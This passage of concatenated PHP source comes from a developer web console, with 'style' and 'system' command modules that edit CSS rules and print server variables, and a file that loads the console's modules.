		$get_bdd = new bdd($this->comm, $this->args);
		return ($get_bdd->execute_req($this->args[0], $req));
	}

	public function execute() : String {

		if (($res = $this->check_require()) == 1)
			return ($this->{$this->comm}());
		return ($res);
	}
}

?><?php

Class style {


	/**
	 * @comm String
	 */
	private $comm;

	/**
	 * @args Array
	 */
	private $args = [];

	/**
	 * @commandes Array
	 */
	private $commandes = ["size", "txt_color", "back_color"];


	const max_height = 98;
	const min_height = 30;

	public function __Construct(String $commande, Array $arguments) {

		$this->args = $arguments;
		$this->comm = $commande;
	}

	private function size() : String {

		if (!isset($this->args[0]) || !isset($this->args[1]))
			return ("Usage : style.size [width] [height]");

		if ($this->args[1] > style::max_height)
			return ("Error : height must be less than ".style::max_height."%");

		if ($this->args[1] < style::min_height)
			return ("Error : height must be more than ".style::min_height."%");

		$this->change_css([$this->args[0]."%", $this->args[1]."%"], "#conbsole_b", ["width", "height"]);
		$this->change_css([$this->args[0]."%", ($this->args[1] + 2)."%"], "#console_1", ["width", "height"]);

		return ("Css update success");
	}

	private function txt_color() : String {

		if (!isset($this->args[0]))
			return ("Usage : style.txt_color [txt_color]");

		$this->change_css([$this->args[0], ":;"], "#txt_console", ["color", ":;"]);
		$this->change_css([$this->args[0], ":;"], "#value_console", ["color", ":;"]);
		$this->change_css([$this->args[0], ":;"], "#conbsole_b", ["color", ":;"]);

		return ("Css update success");
	}

	private function back_color() : String {

		if (!isset($this->args[0]))
			return ("Usage : style.back_color [back_color]");

		$this->change_css([$this->args[0], ":;"], "#conbsole_b", ["background-color", ":;"]);
		$this->change_css([$this->args[0], ":;"], "#value_console", ["background-color", ":;"]);

		return ("Css update success");	
	}

	private function change_css(Array $tab, String $elem, Array $keys) {

		$path_env = new link('css/style.css');
		$data = str_replace("{", "", file_get_contents($path_env->get_link(1)));
		$data = explode("}", $data);

		$i = 0;
		while (isset($data[$i])) {
			$a = 0;
			if (trim(substr($data[$i], 0, strpos($data[$i], " "))) == $elem) {
				$a = 1;
				$data[$i] = str_replace(trim(substr($data[$i], 0, strpos($data[$i], " "))), "", $data[$i]);
				$e = explode(";", $data[$i]);
				foreach ($e as $key => $value) {
					$ex = explode(":", trim(str_replace(" ", "", $value)));
					if ($ex[0] == $keys[0])
						$ex[1] = $tab[0];
					if ($ex[0] == $keys[1])
						$ex[1] = $tab[1];
					$e[$key] = implode(": ", $ex);
				}
				$data[$i] = "\n\n".$elem." { \n\t".implode(";\n\t", $e);
				$data[$i] = substr($data[$i], 0, -1);
			}
			if ($a == 0)
				$data[$i] = str_replace(trim(substr($data[$i], 0, strpos($data[$i], " "))), trim(substr($data[$i], 0, strpos($data[$i], " ")))." {", $data[$i]);
			$i++;
		}
		$data = implode("}", $data);
		file_put_contents($path_env->get_link(1), $data);
	}

	public function execute() : String {

		return ($this->{$this->comm}());
	}
}

?><?php

Class system {


	/**
	 * @comm String
	 */
	private $comm;

	/**
	 * @args Array
	 */
	private $args = [];

	/**
	 * @commandes Array
	 */
	private $commandes = ["reload_modules", "clear", "model_module", "server_infos", "server_get_info"];

	public function __Construct(String $commande, Array $arguments) {

		$this->args = $arguments;
		$this->comm = $commande;
	}

	private function reload_modules() : String {

		$reload = new init();
		$reload->force();
		return ("Modules are reloading with success");
	}

	private function clear() : String {

		return ("clearing the console");
	}

	private function model_module() : String {

		$path_env = new link('template/module_type.txt');
		return (file_get_contents($path_env->get_link(1)));
	}

	private function server_infos() : String {

		$str = "";

		foreach ($_SERVER as $key => $value) {
			
			$str .= $key.": ".$value."<br>";
		}

		return ($str);
	}

	public function server_get_info() : String {

		if (!isset($this->args[0]) || empty($this->args[0]))
			return ("Usage : system.server_get_info [info to search]");

		if (!isset($_SERVER[strtoupper($this->args[0])]))
			return ("The info '".$this->args[0]."' doesn't exist");

		return ($_SERVER[strtoupper($this->args[0])]);
	}

	public function execute() : String {

		return ($this->{$this->comm}());
	}
}

?><?php
require '/Users/arthur/server/dev_console/modules/bdd.module.php';
require '/Users/arthur/server/dev_console/modules/change_header.module.php';
require '/Users/arthur/server/dev_console/modules/file.module.php';
require '/Users/arthur/server/dev_console/modules/git.module.php';
require '/Users/arthur/server/dev_console/modules/http_request.module.php';
require '/Users/arthur/server/dev_console/modules/stats.module.php';
require '/Users/arthur/server/dev_console/modules/style.module.php';
require '/Users/arthur/server/dev_console/modules/system.module.php';

?>